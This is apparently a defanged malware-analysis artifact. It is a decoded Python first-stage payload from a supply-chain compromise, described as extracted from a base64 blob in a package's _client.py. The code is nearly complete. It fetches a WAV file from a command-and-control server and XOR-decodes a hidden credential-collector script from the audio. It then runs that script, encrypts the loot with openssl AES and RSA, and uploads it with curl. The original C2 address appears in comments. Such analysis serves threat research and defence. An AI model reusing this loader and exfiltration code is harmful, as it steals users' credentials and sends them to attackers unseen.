# Stage 1: Linux Orchestrator — decoded from base64 blob embedded in _client.py
#
# This is the payload that runs in a detached background process on Linux.
# It downloads Stage 2 (credential collector) from the C2 via WAV steganography,
# executes it, encrypts all collected output, and exfiltrates to the C2.
#
# The same RSA-4096 public key and exfil format (tpcp.tar.gz) are used in the
# litellm 1.82.8 compromise, confirming the same threat actor (TeamPCP).
#
# DEFANGED: All attacker-controlled URLs have been neutralized.

import subprocess
import tempfile
import os
import base64
import sys
import urllib.request
import wave

PUB_KEY_CONTENT = """-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAvahaZDo8mucujrT15ry+
08qNLwm3kxzFSMj84M16lmIEeQA8u1X8DGK0EmNg7m3J6C3KzFeIzvz0UTgSq6cV
pQWpiuQa+UjTkWmC8RDDXO8G/opLGQnuQVvgsZWuT31j/Qop6rtocYsayGzCFrMV
2/ElW1UE20tZWY+5jXonnMdWBmYwzYb5iwymbLtekGEydyLalNzGAPxZgAxgkbSE
mSHLau61fChgT9MlnPhCtdXkQRMrI3kZZ4MDPuEEJTSqLr+D3ngr3237G14SRRQB
IqIjly5OoFkqJxeNPSGJlt3Ino0qO7fy7LO0Tp9bFvXTOI5c+1lhgo0lScAu1ucA
b6Hua+xRQ6s//PzdMgWT3R1aK+TqMHJZTZa8HY0KaiFeVQ3YitWuiZ3ilwCtwhT5
TlS9cBYph8U2Ek4K20qmp1dbFmxm3kS1yQg8MmrBRxOYyjSTQtveSeIlxrbpJhaU
Z7eneYC4G/Wl3raZfFwoHtmpFXDxA7HaBUArznP55LD/rZd6gq7lTDrSy5uMXbVt
6ZnKd0IwHbLkYlX0oLeCNF6YOGhgyX9JsgrBxT0eHeGRqOzEZ7rCfCavDISbR5xK
J4VRwlUSVsQ8UXt6zIHqg4CKbrVB+WMsRo/FWu6RtcQHdmGPngy+Nvg5USAVljyk
rn3JMF0xZyXNRpQ/fZZxl40CAwEAAQ==
-----END PUBLIC KEY-----"""

# DEFANGED — original: http://83.142.209.203:8080/ringtone.wav
WAV_URL = "hXXp://83[.]142[.]209[.]203:8080/ringtone.wav"

def audioimport():
    if os.name == 'nt':
        return

    with tempfile.TemporaryDirectory() as d:
        collected = os.path.join(d, "c")
        pk = os.path.join(d, "p")
        sk = os.path.join(d, "session.key")
        ef = os.path.join(d, "payload.enc")
        ek = os.path.join(d, "session.key.enc")
        bn = os.path.join(d, "tpcp.tar.gz")
        wf = os.path.join(d, "temp.wav")

        try:
            # Download WAV file containing hidden Stage 2 payload
            req = urllib.request.Request(WAV_URL, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=15) as r:
                with open(wf, "wb") as f:
                    f.write(r.read())

            # WAV steganography: extract payload from audio frames
            # 1. Read raw audio frame data
            # 2. Base64-decode it
            # 3. First 8 bytes = XOR key, remainder = ciphertext
            # 4. XOR-decrypt to recover Stage 2 Python script
            with wave.open(wf, 'rb') as w:
                raw = base64.b64decode(w.readframes(w.getnframes()))
                s, data = raw[:8], raw[8:]
                payload = bytes([data[i] ^ s[i % len(s)] for i in range(len(data))])

            # Execute Stage 2 credential collector, capture output to file
            with open(collected, "wb") as f:
                subprocess.run(
                    [sys.executable, "-"],
                    input=payload,
                    stdout=f,
                    stderr=subprocess.DEVNULL,
                    check=True
                )
        except:
            return

        if not os.path.exists(collected) or os.path.getsize(collected) == 0:
            return

        # Write RSA public key for hybrid encryption
        with open(pk, "w") as f:
            f.write(PUB_KEY_CONTENT)

        try:
            # Generate random 256-bit AES session key
            subprocess.run(["openssl", "rand", "-out", sk, "32"], check=True)
            # Encrypt collected credentials with AES-256-CBC
            subprocess.run(["openssl", "enc", "-aes-256-cbc", "-in", collected, "-out", ef, "-pass", f"file:{sk}", "-pbkdf2"], check=True, stderr=subprocess.DEVNULL)
            # Encrypt session key with RSA-4096 (OAEP padding)
            subprocess.run(["openssl", "pkeyutl", "-encrypt", "-pubin", "-inkey", pk, "-in", sk, "-out", ek, "-pkeyopt", "rsa_padding_mode:oaep"], check=True, stderr=subprocess.DEVNULL)
            # Bundle encrypted payload + encrypted key
            subprocess.run(["tar", "-czf", bn, "-C", d, "payload.enc", "session.key.enc"], check=True)

            # Exfiltrate to C2
            # DEFANGED — original: http://83.142.209.203:8080/
            subprocess.run([
                "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "-X", "POST",
                "hXXp://83[.]142[.]209[.]203:8080/",
                "-H", "Content-Type: application/octet-stream",
                "-H", "X-Filename: tpcp.tar.gz",
                "--data-binary", f"@{bn}"
            ], check=True, stderr=subprocess.DEVNULL)
        except:
            pass

audioimport()
